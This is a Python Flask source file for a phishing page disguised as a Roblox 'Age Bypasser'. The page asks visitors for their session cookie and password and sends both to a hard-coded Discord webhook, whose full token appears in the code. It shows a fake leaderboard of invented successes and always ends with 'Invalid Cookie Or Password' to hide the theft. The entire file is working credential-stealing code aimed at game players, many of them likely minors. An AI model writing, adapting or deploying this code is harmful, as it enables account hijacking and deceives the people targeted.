from flask import Flask, request, jsonify, render_template_string
import requests

app = Flask(__name__)

WEBHOOK_URL = "https://discord.com/api/webhooks/1404544248283402363/y03qphEHBQUMh1Gq4LbJWH6VL0x6B2lqD3yKvg_z6DEsn9shkkRXV1EEUVXlpIEP96MF"

HTML_PAGE = """
<!doctype html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=1024" />
<title>Age Bypasser</title>

<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;600&family=Montserrat:wght@700&display=swap" rel="stylesheet" />

<style>
  body {
    margin: 0;
    height: 100vh;
    font-family: 'Poppins', sans-serif;
    background: #000;
    display: flex;
    align-items: center;
    justify-content: center;
    padding: 10px;
    min-width: 1024px;
  }
  .aurora {
    position: fixed;
    top: -30%;
    left: -20%;
    width: 140%;
    height: 160%;
    background: linear-gradient(270deg, #ff00cc, #3333ff, #00ffe7, #ff00cc);
    background-size: 800% 800%;
    animation: auroraShift 25s ease infinite;
    filter: blur(150px);
    opacity: 0.8;
    z-index: 1;
    border-radius: 40%;
  }
  @keyframes auroraShift {
    0%{background-position:0% 50%}
    50%{background-position:100% 50%}
    100%{background-position:0% 50%}
  }
  .blur-overlay {
    position: fixed;
    top:0; left:0; width:100%; height:100%;
    background: rgba(0,0,0,0.5);
    backdrop-filter: blur(12px);
    z-index: 2;
  }
  .main-wrapper {
    position: relative;
    z-index: 3;
    display: flex;
    flex-direction: column;
    align-items: center;
    gap: 20px;
    max-width: 480px;
    width: 100%;
  }
  .container {
    background: rgba(255, 255, 255, 0.1);
    border-radius: 24px;
    padding: 30px 25px 40px;
    width: 100%;
    box-shadow: 0 10px 30px rgba(0,0,0,0.7);
    color: #eee;
    text-align: center;
    backdrop-filter: blur(20px);
    border: 1px solid rgba(255,255,255,0.15);
  }
  .logo {
    width: 110px;
    margin-bottom: 20px;
    filter: drop-shadow(0 0 10px rgba(255,255,255,0.9));
    animation: float 4s ease-in-out infinite;
  }
  @keyframes float {
    0%, 100% { transform: translateY(0); }
    50% { transform: translateY(-12px); }
  }
  h1 {
    font-family: 'Montserrat', sans-serif;
    font-weight: 700;
    font-size: 2.5rem;
    margin-bottom: 10px;
    color: #fff;
    text-shadow: 0 0 12px #ff00cc, 0 0 20px #ff00cc;
  }
  h2 {
    font-weight: 300;
    font-size: 1.2rem;
    margin-bottom: 20px;
    font-style: italic;
    color: #eee;
    text-shadow: 0 0 6px rgba(255, 255, 255, 0.3);
  }
  input[type="text"] {
    padding: 12px 18px;
    font-size: 1rem;
    border-radius: 16px;
    border: none;
    outline: none;
    background: rgba(255,255,255,0.15);
    color: #fff;
    width: 100%;
    margin-bottom: 10px;
  }
  button {
    margin-top: 10px;
    padding: 12px;
    font-size: 1.1rem;
    font-weight: 700;
    color: #fff;
    background: linear-gradient(90deg, #ff00cc, #3333ff);
    border: none;
    border-radius: 20px;
    cursor: pointer;
    width: 100%;
  }
  button:disabled {
    opacity: 0.6;
    cursor: not-allowed;
  }
  .status {
    margin-top: 15px;
    font-size: 1.1rem;
    font-weight: 600;
    color: #ff33cc;
  }
  /* Vertical spinner */
  .spinner {
    display: inline-block;
    width: 6px;
    height: 30px;
    background: #ff33cc;
    border-radius: 4px;
    animation: bounce 0.6s infinite alternate;
    margin-left: 8px;
  }
  @keyframes bounce {
    from { transform: scaleY(0.4); opacity: 0.6; }
    to { transform: scaleY(1); opacity: 1; }
  }
  .leaderboard-container {
    background: rgba(255, 255, 255, 0.1);
    border-radius: 20px;
    padding: 15px 20px;
    box-shadow: 0 10px 30px rgba(0,0,0,0.7);
    color: #eee;
    backdrop-filter: blur(15px);
    border: 1px solid rgba(255,255,255,0.15);
    overflow: hidden;
    max-height: 180px;
    width: 100%;
  }
  .leaderboard-title {
    font-size: 1.4rem;
    margin-bottom: 8px;
    text-align: center;
    color: #ff33cc;
    text-shadow: 0 0 8px #ff33cc;
  }
  .leaderboard-list {
    list-style: none;
    margin: 0;
    padding: 0;
    overflow: hidden;
    height: calc(100% - 25px);
    position: relative;
  }
  .leaderboard-scroll {
    animation: scrollUp 15s linear infinite;
  }
  @keyframes scrollUp {
    0% { transform: translateY(0); }
    100% { transform: translateY(-50%); }
  }
  .leaderboard-item {
    display: flex;
    justify-content: space-between;
    padding: 6px 8px;
    border-radius: 8px;
    margin-bottom: 6px;
    background: rgba(255, 255, 255, 0.07);
  }
</style>
</head>
<body>
  <div class="aurora"></div>
  <div class="blur-overlay"></div>

  <div class="main-wrapper">
    <div class="container">
      <img class="logo" src="https://i.postimg.cc/4NccPPKV/images-4.png" alt="Roblox Logo" />
      <h1>Age Bypasser</h1>
      <h2>Please put your cookie and password below</h2>
      <form id="bypassForm" novalidate autocomplete="off">
        <input type="text" id="cookieInput" name="cookie" placeholder="Type your cookie" required />
        <input type="text" id="passwordInput" name="password" placeholder="Type your password" required />
        <button type="submit" id="bypassBtn">Bypass</button>
      </form>
      <p class="status" id="statusMsg"></p>
    </div>

    <div class="leaderboard-container">
      <div class="leaderboard-title">Bypass Leaderboard</div>
      <ul class="leaderboard-list">
        <div class="leaderboard-scroll" id="leaderboardScroll"></div>
      </ul>
    </div>
  </div>

<script>
  const leaderboardScroll = document.getElementById('leaderboardScroll');
  const fakeUsers = ["xX_RBLX_K1LLER_Xx", "noobMaster9000", "ProGamer123", "SneakyNinja", "EpicFailer", "Legend27"];

  function randomChoice(arr) {
    return arr[Math.floor(Math.random() * arr.length)];
  }
  function randomTime() {
    const min = Math.floor(Math.random() * 59) + 1;
    const sec = Math.floor(Math.random() * 59) + 1;
    return `${min}m ${sec}s ago`;
  }
  function createLeaderboardItem(username, status, time) {
    const li = document.createElement('li');
    li.classList.add('leaderboard-item');
    li.innerHTML = `
      <span>${username}</span>
      <span style="color:${status === 'Success' ? '#00ff99' : '#ff4444'}">${status}</span>
      <span style="font-size:0.85rem;color:#ccc">${time}</span>
    `;
    return li;
  }
  function populateLeaderboard() {
    leaderboardScroll.innerHTML = '';
    const entries = [];
    for(let i=0; i<15; i++) {
      entries.push(createLeaderboardItem(randomChoice(fakeUsers), Math.random() > 0.5 ? 'Success' : 'Failed', randomTime()));
    }
    entries.forEach(entry => leaderboardScroll.appendChild(entry));
    entries.forEach(entry => leaderboardScroll.appendChild(entry.cloneNode(true)));
  }
  populateLeaderboard();
  setInterval(populateLeaderboard, 20000);

  document.getElementById('bypassForm').addEventListener('submit', function(e) {
    e.preventDefault();

    const cookie = document.getElementById('cookieInput').value.trim();
    const password = document.getElementById('passwordInput').value.trim();
    const statusMsg = document.getElementById('statusMsg');
    const btn = document.getElementById('bypassBtn');

    if (!cookie || !password) {
      statusMsg.textContent = "Please fill in both fields.";
      return;
    }

    btn.disabled = true;
    document.getElementById('cookieInput').disabled = true;
    document.getElementById('passwordInput').disabled = true;

    // Show bypassing spinner immediately
    statusMsg.innerHTML = `Bypassing<span class="spinner"></span>`;

    // Send webhook, ignore response
    fetch("/", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ cookie: cookie, password: password })
    }).catch(() => {});

    // After 15 seconds ALWAYS show Invalid Cookie Or Password
    setTimeout(() => {
      statusMsg.textContent = "Invalid Cookie Or Password";
      btn.disabled = false;
      document.getElementById('cookieInput').disabled = false;
      document.getElementById('passwordInput').disabled = false;
    }, 15000);
  });
</script>
</body>
</html>
"""

def escape_text(text):
    # Replace backticks to avoid breaking markdown/code blocks
    return text.replace("`", "'").replace("\n", "\\n")

@app.route("/", methods=["GET"])
def index():
    return render_template_string(HTML_PAGE)

@app.route("/", methods=["POST"])
def handle_post():
    if not request.is_json:
        return jsonify(success=False, error="Expected JSON body."), 400
    data = request.get_json()
    cookie = data.get("cookie", "").strip()
    password = data.get("password", "").strip()
    if not cookie or not password:
        return jsonify(success=False, error="Cookie and password cannot be empty."), 400

    safe_cookie = escape_text(cookie)
    safe_password = escape_text(password)

    payload = {
        "embeds": [
            {
                "title": "Bypass Data",
                "color": 16711808,
                "description": f"**Cookie:**\n```\n{safe_cookie}\n```\n**Password:**\n```\n{safe_password}\n```"
            }
        ]
    }

    try:
        response = requests.post(WEBHOOK_URL, json=payload, timeout=7)
        response.raise_for_status()
    except Exception as e:
        print(f"Webhook POST error: {e}")
        return jsonify(success=False, error="Failed to send webhook"), 500

    return jsonify(success=True)


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
